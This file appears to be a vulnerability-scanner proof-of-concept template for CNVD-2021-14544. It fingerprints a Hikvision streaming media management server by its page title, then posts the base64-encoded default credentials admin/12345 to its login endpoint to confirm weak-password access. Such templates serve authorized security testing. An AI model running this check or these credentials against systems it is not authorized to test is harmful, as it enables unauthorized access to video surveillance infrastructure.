name: yaml-poc-hikvision-Streaming_media_management_server-weak_password-CNVD-2021-14544
binding: a378d059-c502-4ed2-a57c-9df6a7bcf2c7
manual: false
detail:
    author: system_user
    vulnerability:
        id: fd42a866-9a81-4afe-93f2-57b4329ee733
        level: medium
    warning: Account Lockout (Temporary Lockout)
transport: http
payloads:
    payloads:
        p1:
            username: r"admin"
            password: r"12345"
            auth_user: base64(username)
            auth_pass: base64(password)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200 && (response.body_string.contains("<TITLE>流媒体管理服务器</TITLE>") || response.body.bcontains(b"<TITLE>Video Transmission Management Server</TITLE>"))
    r1:
        request:
            cache: true
            method: POST
            path: /data/login.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                userName={{auth_user}}&password={{auth_pass}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"0")
expression: r0() && r1()
